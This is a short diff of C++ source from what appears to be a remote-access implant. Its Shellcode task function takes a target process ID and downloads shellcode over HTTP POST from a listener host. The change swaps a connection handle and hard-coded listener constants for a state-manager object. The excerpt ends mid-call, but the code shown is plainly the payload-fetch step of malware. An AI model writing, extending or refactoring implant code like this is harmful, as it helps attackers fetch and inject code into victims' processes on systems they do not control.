@@ -2,17 +2,17 @@
 
 namespace Task
 {
-     std::wstring Shellcode(HINTERNET hConnect, const std::wstring& wPid, const std::wstring& wSrc)
+     std::wstring Shellcode(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc)
      {
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
         std::string sSrc = Utils::Convert::UTF8Encode(wSrc);
 
         // Download shellcode
 		System::Http::WinHttpResponse resp = System::Http::SendRequest(
-			hConnect,
-			LISTENER_HOST_W,
-			LISTENER_PORT,
-			REQUEST_PATH_DOWNLOAD_W,
+			sm.GetHConnect(),
+			sm.GetListenerHost(),
+			sm.GetListenerPort(),
+			sm.GetReqPathDownload(),
 			L"POST",
 			L"",
 			(LPVOID)sSrc.c_str(),
